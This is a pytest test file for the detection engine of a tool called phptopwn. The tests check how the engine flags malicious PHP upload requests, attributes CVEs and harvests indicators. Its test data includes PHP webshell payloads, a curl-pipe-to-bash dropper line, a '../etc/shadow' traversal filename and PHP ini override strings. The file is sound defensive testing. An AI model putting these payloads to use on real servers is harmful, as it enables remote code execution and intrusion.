"""Detection engine behaviour: thresholds, CVE attribution, IOC harvesting."""
from __future__ import annotations

import pytest
from conftest import BOUNDARY, build_capture, make_cfg, multipart_body

from phptopwn.detection import analyze
from phptopwn.parsing import enrich_capture


def analyzed_capture(body: bytes = b"", headers: dict | None = None, **kwargs):
    cfg = kwargs.pop("cfg", None) or make_cfg()
    capture = build_capture(body=body, headers=headers, **kwargs)
    enrich_capture(capture)
    return capture, analyze(capture, cfg)


def test_benign_request_has_no_signals():
    capture, analysis = analyzed_capture(
        body=b"note=tip", headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    assert analysis.is_exploit is False
    assert analysis.severity == "info"
    assert analysis.signals == []
    assert capture.client_ip in analysis.iocs["ip"]


def test_sensitive_path_probe_is_low():
    capture, analysis = analyzed_capture(body=b"", method="GET", path="/shell.php", declared=None)
    ids = [signal.id for signal in analysis.signals]
    assert ids == ["sensitive_path_probe"]
    assert analysis.severity == "low"
    assert analysis.is_exploit is False


def test_oversized_multipart_triggers_109618():
    body, boundary = multipart_body([{"name": "blob", "data": "A" * 3000}])
    capture, analysis = analyzed_capture(
        body=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
    )
    ids = [signal.id for signal in analysis.signals]
    assert "large_multipart_upload" in ids
    assert "CVE-2026-109618" in analysis.cves
    assert analysis.is_exploit is True
    signal = next(s for s in analysis.signals if s.id == "large_multipart_upload")
    assert signal.severity == "high"
    assert signal.evidence["body_bytes"] == len(body)
    assert signal.evidence["threshold_bytes"] >= 2048


def test_excessive_parts_and_oversized_part_headers():
    body, boundary = multipart_body(
        [{"name": f"p{i}", "data": "A" * 100} for i in range(6)]
        + [
            {
                "name": "file",
                "filename": "vuln.php",
                "data": b"B" * 300,
                "extra_headers": [f"X-Flood: {'F' * 320}"],
            },
        ]
    )
    capture, analysis = analyzed_capture(
        body=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    ids = [signal.id for signal in analysis.signals]
    assert "excessive_multipart_parts" in ids   # 7 parts > many_parts threshold 4
    assert "oversized_part_headers" in ids      # 320 B part header > 256 B limit
    assert "webshell_upload" in ids  # file part named .php
    signal = next(s for s in analysis.signals if s.id == "oversized_part_headers")
    assert signal.evidence["max_header_bytes"] >= 256


def test_folded_duplicate_long_and_traversal_flags():
    body, boundary = multipart_body(
        [
            {"name": "one", "data": "one", "filename": "a.txt"},
            {"name": "two", "data": "two", "filename": "a.txt"},
            {"name": "three", "data": "big", "filename": "B" * 300 + ".txt"},
            {"name": "four", "data": "deep", "filename": "../etc/shadow"},
        ]
    )
    _, analysis = analyzed_capture(
        body=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
    )
    ids = [signal.id for signal in analysis.signals]
    for expected in (
        "duplicate_upload_filenames",
        "oversized_upload_filename",
        "filename_path_traversal",
    ):
        assert expected in ids, ids
    traversal = next(s for s in analysis.signals if s.id == "filename_path_traversal")
    assert traversal.evidence["filenames"] == ["../etc/shadow"]


def test_missing_and_mangled_boundary():
    body, _ = multipart_body([{"name": "note", "data": "hi"}])
    _, analysis = analyzed_capture(body=body, headers={"Content-Type": "multipart/form-data"})
    assert "multipart_missing_boundary" in [s.id for s in analysis.signals]

    _, analysis = analyzed_capture(
        body=body, headers={"Content-Type": "multipart/form-data; boundary=absent123"}
    )
    assert "mangled_multipart_boundary" in [s.id for s in analysis.signals]
    assert analysis.is_exploit is True


def test_nested_boundary_signal():
    body, boundary = multipart_body(
        [
            {
                "name": "f",
                "filename": "n.bin",
                "content_type": "multipart/mixed; boundary=nestedmarker",
                "data": b"--nestedmarker\r\n",
            }
        ]
    )
    _, analysis = analyzed_capture(
        body=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
    )
    assert "nested_multipart_boundary" in [s.id for s in analysis.signals]


def test_boundary_flood_hits_part_limit():
    body, boundary = multipart_body([{"name": f"p{i}", "data": "x"} for i in range(600)])
    _, analysis = analyzed_capture(
        body=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
    )
    ids = [signal.id for signal in analysis.signals]
    assert "multipart_part_limit_exceeded" in ids
    assert "excessive_multipart_parts" in ids


def test_malformed_framing_signal():
    body = f"--{BOUNDARY}\r\nNO-SEPARATOR\r\n--{BOUNDARY}--\r\n".encode()
    _, analysis = analyzed_capture(
        body=body, headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"}
    )
    assert "mangled_multipart_body" in [s.id for s in analysis.signals]


def test_content_length_overflow_and_truncation():
    capture, analysis = analyzed_capture(
        body=b"small",
        declared=10_000_000,
        headers={"Content-Type": "text/plain"},
        cfg=make_cfg(MAX_BODY_BYTES=4 * 1024 * 1024),  # default is 32 MiB
    )
    ids = [signal.id for signal in analysis.signals]
    assert "content_length_overflow" in ids
    assert "truncated_request_body" in ids
    signal = next(s for s in analysis.signals if s.id == "content_length_overflow")
    assert signal.evidence["declared_content_length"] == 10_000_000
    assert signal.evidence["capture_cap"] == 4 * 1024 * 1024
    assert capture.declared_content_length == 10_000_000


def test_declared_exact_body_is_not_truncated():
    _, analysis = analyzed_capture(body=b"12345", declared=5, headers={"Content-Type": "text/plain"})
    assert "truncated_request_body" not in [s.id for s in analysis.signals]


def test_header_flooding_thresholds():
    headers = {f"X-Flood-{i}": "x" * 300 for i in range(12)}
    _, analysis = analyzed_capture(body=b"", headers={"Content-Type": "text/plain", **headers})
    ids = [s.id for s in analysis.signals]
    assert "header_flooding" in ids
    signal = next(s for s in analysis.signals if s.id == "header_flooding")
    assert signal.evidence["header_count"] >= 8
    assert signal.evidence["header_bytes"] >= 1024


def test_conflicting_length_headers():
    _, analysis = analyzed_capture(
        body=b"chunk me", declared=8, transfer_encoding="chunked", headers={"Content-Type": "text/plain"}
    )
    assert "conflicting_length_headers" in [s.id for s in analysis.signals]
    assert "chunked_multipart_upload" not in [s.id for s in analysis.signals]  # not multipart


def test_chunked_multipart_low():
    body, boundary = multipart_body([{"name": "a", "data": "b"}])
    _, analysis = analyzed_capture(
        body=body,
        declared=None,
        transfer_encoding="chunked",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    ids = [s.id for s in analysis.signals]
    assert "chunked_multipart_upload" in ids
    assert analysis.is_exploit is False  # low severity only


def test_expect_100_continue_with_multipart():
    body, boundary = multipart_body([{"name": "a", "data": "b"}])
    _, analysis = analyzed_capture(
        body=body,
        declared=None,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Expect": "100-continue",
        },
    )
    assert "expect_100_continue_upload" in [s.id for s in analysis.signals]


def test_session_progress_with_webshell_race():
    body, boundary = multipart_body(
        [
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "race"},
            {
                "name": "file",
                "filename": "shell.php",
                "content_type": "application/x-php",
                "data": b"<?php system($_GET['x']);?>",
            },
        ]
    )
    _, analysis = analyzed_capture(
        body=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
    )
    ids = [s.id for s in analysis.signals]
    for expected in (
        "php_session_upload_progress",
        "webshell_upload",
        "session_progress_webshell_race",
    ):
        assert expected in ids, ids
    assert "CVE-2026-109619" in analysis.cves

    progress = next(s for s in analysis.signals if s.id == "php_session_upload_progress")
    assert progress.evidence["markers"] == ["php_session_upload_progress"]


def test_php_ini_header_override():
    _, analysis = analyzed_capture(
        body=b"whatever",
        headers={"Content-Type": "text/plain", "php_value": "auto_prepend_file=/tmp"},
    )
    ids = [s.id for s in analysis.signals]
    assert "php_ini_override_header" in ids
    assert "CVE-2026-109619" in analysis.cves


def test_php_ini_payload_tokens():
    _, analysis = analyzed_capture(
        body=b"allow_url_include=On",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    ids = [s.id for s in analysis.signals]
    assert "php_ini_override_payload" in ids
    assert "CVE-2026-109619" in analysis.cves


def test_tcp_pause_and_slow_body():
    _, analysis = analyzed_capture(
        body=b"chunk" * 4,
        chunk_gaps=[0.11, 0.2],
        body_seconds=0.3,
        headers={"Content-Type": "text/plain"},
    )
    ids = [s.id for s in analysis.signals]
    assert "tcp_stream_pause" in ids
    assert "slow_body_delivery" in ids
    pause = next(s for s in analysis.signals if s.id == "tcp_stream_pause")
    assert pause.evidence["max_chunk_gap_seconds"] == pytest.approx(0.2)
    assert pause.evidence["threshold_seconds"] == pytest.approx(make_cfg().detection.slow_gap_seconds)


def test_incomplete_and_timed_out_streams():
    _, analysis = analyzed_capture(
        body=b"partial",
        declared=7,
        incomplete=True,
        disconnected=True,
        headers={"Content-Type": "text/plain"},
    )
    ids = [s.id for s in analysis.signals]
    assert "incomplete_upload_stream" in ids
    assert "truncated_request_body" not in ids  # declared matches delivered bytes

    _, analysis = analyzed_capture(
        body=b"", declared=100, timed_out=True, headers={"Content-Type": "text/plain"}
    )
    assert "body_read_timeout" in [s.id for s in analysis.signals]


def test_body_exceeds_capture_cap_is_medium():
    capture = build_capture(body=b"big bytes", headers={"Content-Type": "text/plain"})
    capture.body.truncated = True
    analysis = analyze(capture, make_cfg())
    ids = [s.id for s in analysis.signals]
    assert "body_exceeds_capture_cap" in ids
    assert analysis.severity == "medium"


def test_droppers_are_extracted_and_trimmed():
    body = b"curl -s http://203.0.113.9/x.sh | bash\r\n--what-next\r\nwget -q /y.sh"
    _, analysis = analyzed_capture(
        body=body, headers={"Content-Type": "multipart/form-data; boundary=unseen"}
    )
    tools = [dropper["tool"] for dropper in analysis.command_droppers]
    assert "curl" in tools and "wget" in tools
    curl = next(d for d in analysis.command_droppers if d["tool"] == "curl")
    assert curl["command"] == "curl -s http://203.0.113.9/x.sh | bash"
    assert "command_dropper" in [s.id for s in analysis.signals]


def test_php_in_body_with_fields_is_code_not_upload():
    _, analysis = analyzed_capture(
        body=b"q=<?php phpinfo();?>",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    ids = [s.id for s in analysis.signals]
    assert "php_code_in_request" in ids
    assert "webshell_upload" not in ids


def test_command_parameter_signal():
    _, analysis = analyzed_capture(
        body=b"cmd=run", headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    assert "command_parameter" in [s.id for s in analysis.signals]


def test_scanner_user_agent_is_low():
    _, analysis = analyzed_capture(body=b"", method="GET", path="/", headers={"User-Agent": "sqlmap/1.7"})
    assert "scanner_user_agent" in [s.id for s in analysis.signals]
    assert analysis.is_exploit is False


def test_ioc_harvest_with_sha256_on_exploit():
    body, boundary = multipart_body(
        [
            {"name": "meta", "data": "checkout https://evil.example/pwned.php and curl http://10.0.0.1/"},
            {
                "name": "file",
                "filename": "shell.php",
                "content_type": "application/x-php",
                "data": b"<?php system($_GET['c']);?>",
            },
        ]
    )
    capture, analysis = analyzed_capture(
        body=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
    )
    assert analysis.is_exploit is True
    assert "10.0.0.1" in analysis.iocs.get("ip", [])
    assert "https://evil.example/pwned.php" in analysis.iocs.get("url", [])
    assert "evil.example" in analysis.iocs.get("domain", [])
    assert "shell.php" in analysis.iocs.get("filename", [])
    assert capture.body_sha256 in analysis.iocs.get("sha256", [])


def test_repeated_analysis_is_pure():
    body, boundary = multipart_body(
        [
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "race"},
            {"name": "file", "filename": "s.php", "data": b"<?php f(1)"},
        ]
    )
    capture = build_capture(body=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    enrich_capture(capture)
    cfg = make_cfg()
    first = analyze(capture, cfg)
    second = analyze(capture, cfg)
    assert first.to_dict() == second.to_dict()
